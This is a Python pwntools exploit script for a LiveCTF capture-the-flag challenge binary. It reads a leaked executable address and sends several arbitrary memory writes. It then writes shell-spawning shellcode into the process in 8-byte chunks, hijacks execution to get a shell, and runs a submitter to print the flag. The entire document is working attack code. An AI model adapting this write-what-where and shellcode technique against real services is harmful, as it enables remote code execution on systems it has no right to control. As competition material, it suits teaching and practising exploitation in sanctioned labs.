#!/usr/bin/env python3
from pwn import *
split = lambda v,sz: [v[i:i+sz] for i in range(0,len(v),sz)]
uu64 = lambda x: u64(x.ljust(8,b'\0')[:8])

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

#  exe = context.binary = ELF('./handout/challenge')

context.arch = 'amd64'

if args.REMOTE:
    io = remote(HOST, PORT)
    print = lambda *a, **kw: None
else:
    io = process('./handout/challenge')
    if args.PAUSE:
        pause()

PROMPT = b': '
def send(s, endl = False, recv = True):
    if type(s) != bytes:
        if type(s) != str:
            s = f'{s}\n'
        s = s.encode()
    if endl and s[-1] != ord('\n'):
        s += b'\n'
    if PROMPT and recv:
        io.recvuntil(PROMPT)
    io.send(s)

exe_address = u64(io.read(8))
info(f'exe.address = {hex(exe_address)}')

io.send(p64(exe_address + 0x4330))
io.send(p64(exe_address + 0x1370))

io.send(p64(exe_address + 0x4338))
io.send(p64(exe_address + 0x2000))

io.send(p64(exe_address + 0x45C4))
io.send(p64(0xdeadbeef))

io.send(p64(0))

io.send(p32(0xdeadbeef))

base = exe_address + 0x2110
payload = asm(shellcraft.sh())

for idx, data in enumerate(split(payload, 8)):
    io.send(p64(base + idx * 8))
    io.send(data.ljust(8, b'\0'))

io.send(p64(exe_address + 0x4340))

if not args.REMOTE:
    io.interactive()
else:
    io.clean(1)
    io.sendline(b'./submitter')
    flag = io.recvline_contains(b'LiveCTF{').decode().strip()
    success(flag)

